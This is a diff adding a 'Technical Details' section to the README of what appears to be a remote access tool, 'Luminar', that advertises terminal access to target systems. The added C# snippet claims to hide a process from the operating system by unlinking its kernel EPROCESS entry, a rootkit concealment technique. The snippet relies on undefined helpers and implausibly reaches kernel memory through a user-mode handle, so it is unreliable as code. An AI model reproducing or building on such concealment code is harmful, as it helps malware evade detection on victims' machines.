@@ -191,3 +191,32 @@ Provides terminal access to the target system with full command execution capabi
 - Password management
 - Client export functionality
 - Account deletion options
+
+## Technical Details
+
+### Process Manipulation
+
+Luminar utilizes advanced kernel-level techniques for process manipulation and monitoring:
+
+```csharp
+// Process hiding implementation using direct kernel manipulation
+public static bool HideProcess(int pid)
+{
+    IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+    if (hProcess == IntPtr.Zero)
+        return false;
+        
+    // Locate the EPROCESS structure in kernel memory
+    IntPtr pEPROCESS = GetProcessEPROCESS(hProcess);
+    
+    // Unlink the process from ActiveProcessLinks
+    if (UnlinkProcessFromList(pEPROCESS))
+    {
+        CloseHandle(hProcess);
+        return true;
+    }
+    
+    CloseHandle(hProcess);
+    return false;
+}
+```
